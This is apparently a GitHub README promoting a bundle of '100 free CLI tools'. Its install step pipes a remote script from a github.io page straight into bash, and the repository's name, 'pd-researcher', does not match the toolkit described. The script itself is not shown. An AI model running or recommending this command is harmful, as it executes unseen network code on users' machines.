# ⚡️ 100 Free CLI Tools — Zero Dependencies, MIT Licensed

![License](https://img.shields.io/badge/license-MIT-blue.svg)
![Version](https://img.shields.io/badge/version-1.0.0-green.svg)
![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)

**Stop writing the same scripts over and over. Start shipping.**

This repository contains **100 battle-tested, single-file CLI tools**. Zero dependencies. Just copy, paste, and run. Built to automate your workflow and save you hours every week. From cloud management to local productivity, we've got a tool for that.

## 🚀 Quick Start

Get the entire suite in seconds:

```bash
# Install via curl (Recommended)
curl -fsSL https://barrowryan89-cloud.github.io/pd-researcher/install.sh | bash

# Or clone and install manually
git clone https://github.com/barrowryan89-cloud/pd-researcher.git
cd pd-researcher
./install.sh
```

## ✨ Why this toolkit?

I built these tools because I was tired of:
- ❌ Manually clicking through AWS/GCP consoles
- ❌ Writing "quick" python scripts that took 2 hours
- ❌ Losing context switching between browser and terminal

**This toolkit solves that.**

## 🛠️ The Tools (Highlights)

| Category | Tools | Description |
|----------|-------|-------------|
| **Cloud** | `aws-nuke-lite`, `s3-sync-fast` | Manage cloud resources without the lag. |
| **DevOps** | `docker-cleanup`, `k8s-pod-spy` | Keep your environments clean and visible. |
| **Productivity** | `todo-cli`, `pomodoro-term` | Stay focused without leaving the command line. |
| **Network** | `port-killer`, `wifi-boost` | Debug network issues instantly. |
| **Data** | `json-prettify`, `csv-to-sql` | Data transformation one-liners. |

*(Full list available in [docs/TOOLS.md](docs/TOOLS.md))*

## 📸 Usage Examples

**1. Clean up stale Docker containers:**
```bash
$ dev-tools docker-clean --force
> Removing 12 stopped containers...
> Reclaiming 2.4GB space... Done.
```

**2. Quick S3 Backup:**
```bash
$ dev-tools s3-sync ./local-project s3://my-bucket/backup
> Syncing 450 files... [====================] 100%
```

## 🤝 Contributing

We love community tools!
1. Fork the repo
2. Create your feature branch (`git checkout -b feature/amazing-tool`)
3. Commit your changes
4. Push to the branch
5. Open a Pull Request

## 📄 License

Distributed under the MIT License. See `LICENSE` for more information.

---
*Built by Developers, for Developers.*
